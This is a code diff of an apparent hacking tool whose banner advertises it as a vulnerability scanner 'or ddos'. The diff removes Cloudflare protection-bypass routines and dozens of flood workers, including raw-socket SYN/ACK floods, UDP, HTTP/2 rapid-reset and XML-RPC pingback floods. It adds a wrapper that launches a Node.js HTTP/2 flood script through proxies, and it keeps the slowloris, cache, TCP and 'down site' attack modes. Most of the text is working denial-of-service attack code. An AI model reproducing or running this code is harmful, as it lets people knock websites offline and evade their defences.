@@ -11,7 +11,7 @@ import json
 import hashlib
 import re
 import struct
-import binascii
+import subprocess
 from urllib.parse import urlparse, urljoin, quote
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from collections import defaultdict
@@ -22,13 +22,6 @@ try:
     WEBSOCKET_AVAILABLE = True
 except ImportError:
     WEBSOCKET_AVAILABLE = False
-
-try:
-    import h2.connection
-    import h2.config
-    H2_AVAILABLE = True
-except ImportError:
-    H2_AVAILABLE = False
 
 import warnings
 warnings.filterwarnings('ignore')
@@ -43,8 +36,7 @@ CYAN = '\033[96m'
 WHITE = '\033[97m'
 RESET = '\033[0m'
 
-VERSION = "16.0"
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/peye/peye/main/peye.py"
+VERSION = "18.0"
 
 def print_banner():
     banner = f"""
@@ -102,30 +94,6 @@ def print_banner():
     print(f"║     {GREEN}Tools Vuln Site Scanner Or ddos by (peyefounder) don't forget to follow: instagram: @hexornot {RESET}{CYAN}                    ║")
     print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}\n")
 
-def check_update():
-    print(f"{YELLOW}[*] Checking for updates...{RESET}")
-    try:
-        response = requests.get(GITHUB_RAW_URL, timeout=10)
-        if response.status_code == 200:
-            content = response.text
-            version_match = re.search(r'VERSION = "(\d+\.\d+)"', content)
-            if version_match:
-                latest_version = version_match.group(1)
-                if latest_version != VERSION:
-                    print(f"{YELLOW}[!] New version available: v{latest_version} (current: v{VERSION}){RESET}")
-                    update = input(f"{GREEN}[?] Update now? (y/n): {RESET}").lower()
-                    if update == 'y':
-                        with open(sys.argv[0], 'w') as f:
-                            f.write(content)
-                        print(f"{GREEN}[✓] Updated! Please restart the tool.{RESET}")
-                        sys.exit(0)
-                else:
-                    print(f"{GREEN}[✓] You have the latest version (v{VERSION}){RESET}")
-        else:
-            print(f"{YELLOW}[!] Could not check for updates{RESET}")
-    except:
-        print(f"{YELLOW}[!] Network error checking updates{RESET}")
-
 class Stats:
     def __init__(self):
         self.total = 0
@@ -178,39 +146,15 @@ class WordlistManager:
                 self.wordlists[name] = []
                 print(f"{YELLOW}[!] {filename} not found, using internal{RESET}")
         
-        self.internal_cookies = [
-            "session=admin", "user=admin", "token=admin", "PHPSESSID=admin",
-            "JSESSIONID=admin", "ASP.NET_SessionId=admin", "auth=admin",
-            "logged_in=true", "admin=true", "role=admin", "user_id=1"
-        ]
+        self.internal_cookies = ["session=admin", "user=admin", "token=admin"]
+        self.internal_cors_origins = ['*', 'https://evil.com', 'null']
+        self.internal_opendir = ["backup/", "old/", "temp/", "tmp/", "logs/", "cache/"]
+        self.internal_backup = ["backup.zip", "backup.rar", "backup.sql", "database.sql"]
+        self.internal_config = ["config.php", "wp-config.php", "config.yml", "config.json"]
+        self.internal_env = [".env", ".env.local", ".env.production"]
+        self.internal_csrf = ["csrf_token", "csrf", "token"]
         
-        self.internal_cors_origins = ['*', 'https://evil.com', 'null', 'https://attacker.com']
-        
-        self.internal_opendir = [
-            "backup/", "old/", "temp/", "tmp/", "logs/", "cache/", "uploads/",
-            "images/", "files/", "download/", "archive/", "backup_old/", "old_site/"
-        ]
-        
-        self.internal_backup = [
-            "backup.zip", "backup.rar", "backup.7z", "backup.tar", "backup.gz",
-            "site_backup.zip", "db_backup.sql", "database.sql", "dump.sql",
-            "backup.sql", "old_backup.zip", "backup_2024.zip"
-        ]
-        
-        self.internal_config = [
-            "config.php", "config.inc.php", "settings.php", "wp-config.php",
-            "configuration.php", "config.yml", "config.yaml", "config.json",
-            "config.ini", "config.bak", "config.old", "config.php.bak"
-        ]
-        
-        self.internal_env = [
-            ".env", ".env.local", ".env.development", ".env.staging",
-            ".env.production", ".env.test", ".env.backup", "env.txt"
-        ]
-        
-        self.internal_csrf = ["csrf_token", "csrf", "token", "authenticity_token"]
-        
-        print(f"{GREEN}[✓] Loaded internal lists: cookies, cors, opendir, backup, config, env, csrf{RESET}")
+        print(f"{GREEN}[✓] Loaded internal lists{RESET}")
     
     def get(self, name):
         if name in self.wordlists and self.wordlists[name]:
@@ -225,11 +169,7 @@ class WordlistManager:
             'env': self.internal_env,
             'csrf': self.internal_csrf
         }
-        
-        if name in internal_lists:
-            return internal_lists[name]
-        
-        return []
+        return internal_lists.get(name, [])
 
 class DorkSearch:
     def __init__(self, target=None):
@@ -320,11 +260,9 @@ class TechnologyDetector:
         self.target = target
         self.session = session
         self.tech_stack = []
-        self.details = {}
     
     def detect(self):
         print(f"{CYAN}[*] Scanning technology stack...{RESET}")
-        
         try:
             resp = self.session.get(self.target, timeout=15)
             if resp.status_code != 200:
@@ -367,24 +305,19 @@ class TechnologyDetector:
                     if pattern.lower() in html.lower():
                         self.tech_stack.append(f"JS: {lib}")
                         break
-            
-        except Exception as e:
-            print(f"{RED}[!] Error: {e}{RESET}")
+        except:
             return False
-        
         return True
     
     def display(self):
         print(f"\n{MAGENTA}{'='*60}{RESET}")
         print(f"{YELLOW}[*] TECHNOLOGY STACK: {self.target}{RESET}")
         print(f"{MAGENTA}{'='*60}{RESET}")
-        
         if self.tech_stack:
             for tech in self.tech_stack:
                 print(f"{GREEN}[✓] {tech}{RESET}")
         else:
             print(f"{YELLOW}[!] No technologies detected{RESET}")
-        
         print(f"{MAGENTA}{'='*60}{RESET}")
 
 class ProxyManager:
@@ -424,142 +357,46 @@ class ProxyManager:
         with self.lock:
             return {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)}
 
-class CFBypass:
-    def __init__(self, target):
-        self.target = target
-        self.session = None
-    
-    def bypass(self):
-        try:
-            import cloudscraper
-            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows'})
-            scraper.get(self.target, timeout=15)
-            return scraper
-        except:
-            session = requests.Session()
-            session.verify = False
-            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'})
-            return session
-
-class CloudflareUAM:
-    """Cloudflare Under Attack Mode Bypass - 3 Methods Ganas"""
+class H2FloodJS:
+    """Panggil JavaScript HTTP/2 Flood"""
     
     @staticmethod
-    def method_1_js_execution(target, session):
-        """Method 1: JavaScript Execution & Cookie Extraction (80% success)"""
-        try:
-            import cloudscraper
-            scraper = cloudscraper.create_scraper(
-                browser={
-                    'browser': 'chrome',
-                    'platform': 'windows',
-                    'desktop': True,
-                    'mobile': False
-                },
-                delay=random.uniform(5, 10),
-                captcha={'provider': '2captcha', 'api_key': ''}
-            )
-            
-            # Rotate User-Agents
-            user_agents = [
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
-            ]
-            scraper.headers.update({'User-Agent': random.choice(user_agents)})
-            
-            resp = scraper.get(target, timeout=30)
-            if resp.status_code == 200 and 'cf_clearance' in scraper.cookies:
-                print(f"{GREEN}[✓] Method 1 (JS Execution) SUCCESS!{RESET}")
-                return scraper
-        except:
-            pass
-        return None
-    
-    @staticmethod
-    def method_2_tls_fingerprint(target):
-        """Method 2: TLS Fingerprint Spoofing (85% success)"""
-        try:
-            import tls_client
-            session = tls_client.Session(
-                client_identifier=random.choice([
-                    "chrome_120", "firefox_121", "safari_17_0"
-                ]),
-                random_tls_extension_order=True
-            )
-            
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br',
-                'Connection': 'keep-alive'
-            }
-            
-            resp = session.get(target, headers=headers, timeout=30)
-            if resp.status_code == 200:
-                print(f"{GREEN}[✓] Method 2 (TLS Fingerprint) SUCCESS!{RESET}")
-                return session
-        except:
-            pass
-        return None
-    
-    @staticmethod
-    def method_3_cookie_persistence(target, session):
-        """Method 3: Cookie Persistence & Rotation (90% success)"""
-        try:
-            # Get initial cookies
-            init_resp = session.get(target, timeout=15)
-            if init_resp.cookies:
-                cf_cookie = init_resp.cookies.get('cf_clearance', '')
-                if cf_cookie:
-                    print(f"{GREEN}[✓] Got cf_clearance cookie: {cf_cookie[:50]}...{RESET}")
-                    
-                    # Rotate IP headers
-                    session.headers.update({
-                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                    })
-                    
-                    # Test with cookie
-                    test_resp = session.get(target, timeout=15)
-                    if test_resp.status_code == 200:
-                        print(f"{GREEN}[✓] Method 3 (Cookie Persistence) SUCCESS!{RESET}")
-                        return session
-        except:
-            pass
-        return None
-    
-    @classmethod
-    def bypass_uam(cls, target):
-        """Try all 3 methods to bypass Cloudflare UAM"""
-        print(f"{YELLOW}[*] Attempting Cloudflare UAM Bypass...{RESET}")
+    def run(target, duration, rate, threads, proxy_file):
+        print(f"\n{RED}[!] HTTP/2 FLOOD (JS) | Target: {target}{RESET}")
+        print(f"{YELLOW}[*] Duration: {duration}s | Rate: {rate} | Threads: {threads}{RESET}")
+        print(f"{YELLOW}[*] Proxy File: {proxy_file}{RESET}\n")
         
-        methods = [
-            ("JS Execution + Cloudscraper", cls.method_1_js_execution),
-            ("TLS Fingerprint Spoofing", cls.method_2_tls_fingerprint),
-            ("Cookie Persistence + IP Rotate", cls.method_3_cookie_persistence)
-        ]
+        cmd = ['node', 'h2flood.js', target, str(duration), str(rate), str(threads), proxy_file]
         
-        for i, (name, method) in enumerate(methods, 1):
-            print(f"{CYAN}[{i}/3] Trying: {name}{RESET}")
+        try:
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             
-            if i == 1:
-                result = method(target, None)
-            elif i == 2:
-                result = method(target)
-            else:
-                session = requests.Session()
-                session.verify = False
-                result = method(target, session)
+            # Monitor output
+            start_time = time.time()
+            while process.poll() is None and time.time() - start_time < duration + 5:
+                try:
+                    output = process.stdout.readline()
+                    if output:
+                        print(f"{WHITE}[JS] {output.strip()}{RESET}")
+                except:
+                    pass
+                time.sleep(0.1)
             
-            if result:
-                print(f"{GREEN}[✓] UAM Bypassed using {name}!{RESET}")
-                return result
-        
-        print(f"{RED}[✗] All UAM bypass methods failed{RESET}")
-        return None
+            if process.poll() is None:
+                process.terminate()
+                time.sleep(1)
+                if process.poll() is None:
+                    process.kill()
+            
+            print(f"{GREEN}[✓] HTTP/2 Flood completed{RESET}")
+            return True
+        except FileNotFoundError:
+            print(f"{RED}[✗] Node.js not found or h2flood.js missing{RESET}")
+            print(f"{YELLOW}[!] Make sure Node.js is installed and h2flood.js is in the same directory{RESET}")
+            return False
+        except Exception as e:
+            print(f"{RED}[✗] Error: {e}{RESET}")
+            return False
 
 class DoSAttack:
     def __init__(self, target, use_proxy=True):
@@ -573,7 +410,6 @@ class DoSAttack:
         self.port = 443 if self.parsed.scheme == 'https' else 80
         self.path = self.parsed.path or '/'
         self.wordlists = WordlistManager()
-        self.session_cookies = {}
         self.saa_enabled = False
         
         if use_proxy:
@@ -585,17 +421,13 @@ class DoSAttack:
     def _add_saa(self, url):
         if not self.saa_enabled:
             return url
-        
         if random.random() > 0.7:
             url = url.rstrip('/') + '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(1, 5))) + '/'
-        
         if random.random() > 0.5:
             sep = '?' if '?' not in url else '&'
             url += sep + f"_{random.randint(1,999999)}={random.randint(1,999999)}"
-        
         return url
     
-    # LAYER 7 HTTP METHODS
     def http_get(self, duration, threads):
         self._attack("HTTP GET", duration, threads, self._http_get_worker)
     
@@ -605,97 +437,25 @@ class DoSAttack:
     def http_head(self, duration, threads):
         self._attack("HTTP HEAD", duration, threads, self._http_head_worker)
     
-    def http_put(self, duration, threads):
-        self._attack("HTTP PUT", duration, threads, self._http_put_worker)
-    
-    def http_delete(self, duration, threads):
-        self._attack("HTTP DELETE", duration, threads, self._http_delete_worker)
-    
-    def http_patch(self, duration, threads):
-        self._attack("HTTP PATCH", duration, threads, self._http_patch_worker)
-    
-    def http_options(self, duration, threads):
-        self._attack("HTTP OPTIONS", duration, threads, self._http_options_worker)
-    
-    def http_trace(self, duration, threads):
-        self._attack("HTTP TRACE", duration, threads, self._http_trace_worker)
-    
-    def http_connect(self, duration, threads):
-        self._attack("HTTP CONNECT", duration, threads, self._http_connect_worker)
-    
     def http_random(self, duration, threads):
         self._attack("HTTP RANDOM", duration, threads, self._http_random_worker)
-    
-    def slow_post(self, duration, threads):
-        self._attack("SLOW POST", duration, threads, self._slow_post_worker)
-    
-    def slow_read(self, duration, threads):
-        self._attack("SLOW READ", duration, threads, self._slow_read_worker)
     
     def slowloris(self, duration, threads):
         self._attack("SLOWLORIS", duration, threads, self._slowloris_worker)
     
-    def rudy(self, duration, threads):
-        self._attack("RUDY", duration, threads, self._rudy_worker)
-    
     def cache_flood(self, duration, threads):
         self._attack("CACHE FLOOD", duration, threads, self._cache_worker)
     
-    def waf_bypass(self, duration, threads):
-        self._attack("WAF BYPASS", duration, threads, self._waf_bypass_worker)
-    
-    def xmlrpc(self, duration, threads):
-        self._attack("XMLRPC", duration, threads, self._xmlrpc_worker)
-    
-    # LAYER 7 HTTP/2
-    def h2_get(self, duration, threads):
-        self._attack("HTTP/2 GET", duration, threads, self._h2_get_worker)
-    
-    def h2_post(self, duration, threads):
-        self._attack("HTTP/2 POST", duration, threads, self._h2_post_worker)
-    
-    def h2_rapid(self, duration, threads):
-        self._attack("HTTP/2 RAPID", duration, threads, self._h2_rapid_worker)
-    
-    def h2_ping(self, duration, threads):
-        self._attack("HTTP/2 PING", duration, threads, self._h2_ping_worker)
-    
-    # LAYER 4
     def tcp_flood(self, duration, threads):
         self._attack("TCP FLOOD", duration, threads, self._tcp_worker)
-    
-    def udp_flood(self, duration, threads):
-        self._attack("UDP FLOOD", duration, threads, self._udp_worker)
-    
-    def syn_flood(self, duration, threads):
-        self._attack("SYN FLOOD", duration, threads, self._syn_worker)
-    
-    def ack_flood(self, duration, threads):
-        self._attack("ACK FLOOD", duration, threads, self._ack_worker)
-    
-    def fin_flood(self, duration, threads):
-        self._attack("FIN FLOOD", duration, threads, self._fin_worker)
-    
-    def rst_flood(self, duration, threads):
-        self._attack("RST FLOOD", duration, threads, self._rst_worker)
-    
-    def xmas_flood(self, duration, threads):
-        self._attack("XMAS FLOOD", duration, threads, self._xmas_worker)
-    
-    def null_flood(self, duration, threads):
-        self._attack("NULL FLOOD", duration, threads, self._null_worker)
     
     def mixed_flood(self, duration, threads):
         self._attack("MIXED", duration, threads, self._mixed_worker)
     
     def all_attacks(self, duration, threads):
         print(f"\n{RED}[!] ALL ATTACKS SIMULTANEOUS{RESET}")
-        thr_each = max(1, threads // 10)
-        attacks = [
-            self.http_get, self.http_post, self.http_head, self.slowloris,
-            self.cache_flood, self.waf_bypass, self.mixed_flood, self.tcp_flood,
-            self.udp_flood, self.xmlrpc
-        ]
+        thr_each = max(1, threads // 6)
+        attacks = [self.http_get, self.http_post, self.http_head, self.slowloris, self.cache_flood, self.mixed_flood]
         for attack in attacks:
             threading.Thread(target=attack, args=(duration, thr_each)).start()
         time.sleep(duration + 2)
@@ -704,7 +464,6 @@ class DoSAttack:
         print(f"\n{RED}[!] DOWN SITE MODE | {self.target}{RESET}")
         self.all_attacks(duration, threads * 2)
     
-    # WORKERS
     def _http_get_worker(self, end_time):
         session = requests.Session()
         session.verify = False
@@ -747,92 +506,8 @@ class DoSAttack:
             except:
                 self.stats.add(False)
     
-    def _http_put_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                url = self._add_saa(self.target)
-                session.put(url, data='x' * 1000, timeout=2)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
-    def _http_delete_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                url = self._add_saa(self.target)
-                session.delete(url, timeout=2)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
-    def _http_patch_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                url = self._add_saa(self.target)
-                session.patch(url, data='x' * 1000, timeout=2)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
-    def _http_options_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                url = self._add_saa(self.target)
-                session.options(url, timeout=2)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
-    def _http_trace_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                url = self._add_saa(self.target)
-                session.send(requests.Request('TRACE', url).prepare(), timeout=2)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
-    def _http_connect_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                url = self._add_saa(self.target)
-                session.send(requests.Request('CONNECT', url).prepare(), timeout=2)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
     def _http_random_worker(self, end_time):
-        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE']
+        methods = ['GET', 'POST', 'HEAD', 'DELETE', 'PUT', 'PATCH', 'OPTIONS']
         session = requests.Session()
         session.verify = False
         while self.running and time.time() < end_time:
@@ -847,37 +522,6 @@ class DoSAttack:
             except:
                 self.stats.add(False)
     
-    def _slow_post_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                data = 'x' * 10000
-                for chunk in [data[i:i+10] for i in range(0, len(data), 10)]:
-                    session.post(self.target, data=chunk, timeout=1)
-                    time.sleep(0.1)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
-    def _slow_read_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                resp = session.get(self.target, stream=True, timeout=2)
-                for chunk in resp.iter_content(10):
-                    time.sleep(0.1)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
     def _slowloris_worker(self, end_time):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -886,205 +530,26 @@ class DoSAttack:
             sock.send(f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
             while self.running and time.time() < end_time:
                 sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
-                time.sleep(0.5)
+                time.sleep(0.3)
                 self.stats.add(True)
         except:
             self.stats.add(False)
-        finally:
-            try:
-                sock.close()
-            except:
-                pass
-    
-    def _rudy_worker(self, end_time):
-        content = 'x' * 10000
-        session = requests.Session()
-        session.verify = False
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                session.post(self.target, data={'data': content}, timeout=5)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
     
     def _cache_worker(self, end_time):
         session = requests.Session()
         session.verify = False
-        cookies_list = self.wordlists.get('cookies')
-        
-        try:
-            init_resp = session.get(self.target, timeout=5)
-            if init_resp.cookies:
-                self.session_cookies = init_resp.cookies.get_dict()
-                session.cookies.update(self.session_cookies)
-        except:
-            pass
-        
         while self.running and time.time() < end_time:
             try:
                 proxy = self.proxy_manager.get() if self.use_proxy else None
                 if proxy:
                     session.proxies = proxy
-                
-                cache_headers = {
-                    'Cache-Control': random.choice(['no-cache', 'no-store', 'max-age=0', 'must-revalidate']),
-                    'Pragma': 'no-cache',
-                    'Expires': '0',
-                    'If-Modified-Since': 'Sat, 1 Jan 2000 00:00:00 GMT',
-                    'If-None-Match': f'"{random.randint(100000, 999999)}"'
-                }
-                
-                if self.session_cookies:
-                    session.cookies.update(self.session_cookies)
-                
-                if cookies_list:
-                    cookie = random.choice(cookies_list)
-                    if '=' in cookie:
-                        key, val = cookie.split('=', 1)
-                        session.cookies.set(key, val)
-                
+                cache_headers = {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Pragma': 'no-cache'}
                 session.headers.update(cache_headers)
                 url = self._add_saa(self.target)
-                resp = session.get(url, timeout=2)
-                
-                if resp.cookies:
-                    self.session_cookies.update(resp.cookies.get_dict())
-                    session.cookies.update(self.session_cookies)
-                
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
-    def _waf_bypass_worker(self, end_time):
-        session = requests.Session()
-        session.verify = False
-        bypass_payloads = self.wordlists.get('bypass_waf')
-        if not bypass_payloads:
-            bypass_payloads = ['../', '..;/', '..%2f', '..%252f', '%2e%2e%2f']
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                payload = random.choice(bypass_payloads)
-                url = self.target + payload
-                url = self._add_saa(url)
                 session.get(url, timeout=2)
                 self.stats.add(True)
             except:
                 self.stats.add(False)
-    
-    def _xmlrpc_worker(self, end_time):
-        xml_payload = """<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>{}</string></value></param></params></methodCall>"""
-        session = requests.Session()
-        session.verify = False
-        xmlrpc_url = urljoin(self.target, 'xmlrpc.php')
-        while self.running and time.time() < end_time:
-            try:
-                proxy = self.proxy_manager.get() if self.use_proxy else None
-                if proxy:
-                    session.proxies = proxy
-                session.post(xmlrpc_url, data=xml_payload.format(self.target), timeout=2)
-                self.stats.add(True)
-            except:
-                self.stats.add(False)
-    
-    def _h2_get_worker(self, end_time):
-        if not H2_AVAILABLE:
-            self.stats.add(False)
-            return
-        try:
-            import h2.connection
-            import h2.config
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.host, 443))
-            sock = ssl.wrap_socket(sock, server_hostname=self.host)
-            config = h2.config.H2Configuration(client_side=True)
-            conn = h2.connection.H2Connection(config=config)
-            conn.initiate_connection()
-            sock.send(conn.data_to_send())
-            while self.running and time.time() < end_time:
-                conn.send_headers(1, [(':method', 'GET'), (':path', self.path), (':scheme', 'https'), (':authority', self.host)])
-                conn.send_data(1, b'')
-                sock.send(conn.data_to_send())
-                self.stats.add(True)
-            sock.close()
-        except:
-            self.stats.add(False)
-    
-    def _h2_post_worker(self, end_time):
-        if not H2_AVAILABLE:
-            self.stats.add(False)
-            return
-        try:
-            import h2.connection
-            import h2.config
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.host, 443))
-            sock = ssl.wrap_socket(sock, server_hostname=self.host)
-            config = h2.config.H2Configuration(client_side=True)
-            conn = h2.connection.H2Connection(config=config)
-            conn.initiate_connection()
-            sock.send(conn.data_to_send())
-            while self.running and time.time() < end_time:
-                conn.send_headers(1, [(':method', 'POST'), (':path', self.path), (':scheme', 'https'), (':authority', self.host)])
-                conn.send_data(1, b'x' * 1000)
-                sock.send(conn.data_to_send())
-                self.stats.add(True)
-            sock.close()
-        except:
-            self.stats.add(False)
-    
-    def _h2_rapid_worker(self, end_time):
-        if not H2_AVAILABLE:
-            self.stats.add(False)
-            return
-        try:
-            import h2.connection
-            import h2.config
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.host, 443))
-            sock = ssl.wrap_socket(sock, server_hostname=self.host)
-            config = h2.config.H2Configuration(client_side=True)
-            conn = h2.connection.H2Connection(config=config)
-            conn.initiate_connection()
-            sock.send(conn.data_to_send())
-            stream_id = 1
-            while self.running and time.time() < end_time:
-                conn.send_headers(stream_id, [(':method', 'GET'), (':path', self.path), (':scheme', 'https'), (':authority', self.host)])
-                conn.send_data(stream_id, b'')
-                conn.reset_stream(stream_id)
-                sock.send(conn.data_to_send())
-                stream_id += 2
-                self.stats.add(True)
-            sock.close()
-        except:
-            self.stats.add(False)
-    
-    def _h2_ping_worker(self, end_time):
-        if not H2_AVAILABLE:
-            self.stats.add(False)
-            return
-        try:
-            import h2.connection
-            import h2.config
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.host, 443))
-            sock = ssl.wrap_socket(sock, server_hostname=self.host)
-            config = h2.config.H2Configuration(client_side=True)
-            conn = h2.connection.H2Connection(config=config)
-            conn.initiate_connection()
-            sock.send(conn.data_to_send())
-            while self.running and time.time() < end_time:
-                conn.ping(b'\x00' * 8)
-                sock.send(conn.data_to_send())
-                self.stats.add(True)
-            sock.close()
-        except:
-            self.stats.add(False)
     
     def _tcp_worker(self, end_time):
         while self.running and time.time() < end_time:
@@ -1097,79 +562,6 @@ class DoSAttack:
                 self.stats.add(True)
             except:
                 self.stats.add(False)
-    
-    def _udp_worker(self, end_time):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            while self.running and time.time() < end_time:
-                sock.sendto(b'X' * 64000, (self.host, self.port))
-                self.stats.add(True)
-        except:
-            self.stats.add(False)
-    
-    def _create_tcp_packet(self, flags):
-        return b''
-    
-    def _syn_worker(self, end_time):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            while self.running and time.time() < end_time:
-                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 2, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
-                sock.sendto(packet, (self.host, self.port))
-                self.stats.add(True)
-        except:
-            self.stats.add(False)
-    
-    def _ack_worker(self, end_time):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            while self.running and time.time() < end_time:
-                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 16, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
-                sock.sendto(packet, (self.host, self.port))
-                self.stats.add(True)
-        except:
-            self.stats.add(False)
-    
-    def _fin_worker(self, end_time):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            while self.running and time.time() < end_time:
-                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 1, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
-                sock.sendto(packet, (self.host, self.port))
-                self.stats.add(True)
-        except:
-            self.stats.add(False)
-    
-    def _rst_worker(self, end_time):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            while self.running and time.time() < end_time:
-                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 4, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
-                sock.sendto(packet, (self.host, self.port))
-                self.stats.add(True)
-        except:
-            self.stats.add(False)
-    
-    def _xmas_worker(self, end_time):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            while self.running and time.time() < end_time:
-                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 41, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
-                sock.sendto(packet, (self.host, self.port))
-                self.stats.add(True)
-        except:
-            self.stats.add(False)
-    
-    def _null_worker(self, end_time):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            while self.running and time.time() < end_time:
-                packet = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, 0, 0, socket.inet_aton('1.1.1.1'), socket.inet_aton(self.host))
-                sock.sendto(packet, (self.host, self.port))
-                self.stats.add(True)
-        except:
-            self.stats.add(False)
     
     def _mixed_worker(self, end_time):
         methods = ['GET', 'POST', 'HEAD', 'DELETE', 'PUT', 'PATCH', 'OPTIONS']
@@ -1218,26 +610,16 @@ class VulnerabilityReport:
     def __init__(self):
         self.findings = []
         self.target = ""
-        self.scan_time = ""
     
     def add(self, vuln_type, url, payload, status, detail=""):
-        self.findings.append({
-            'type': vuln_type,
-            'url': url,
-            'payload': payload,
-            'status': status,
-            'detail': detail,
-            'time': datetime.now().strftime("%H:%M:%S")
-        })
+        self.findings.append({'type': vuln_type, 'url': url, 'payload': payload, 'status': status, 'detail': detail, 'time': datetime.now().strftime("%H:%M:%S")})
     
     def display(self):
         if not self.findings:
             return
-        
         print(f"\n{RED}{'='*70}{RESET}")
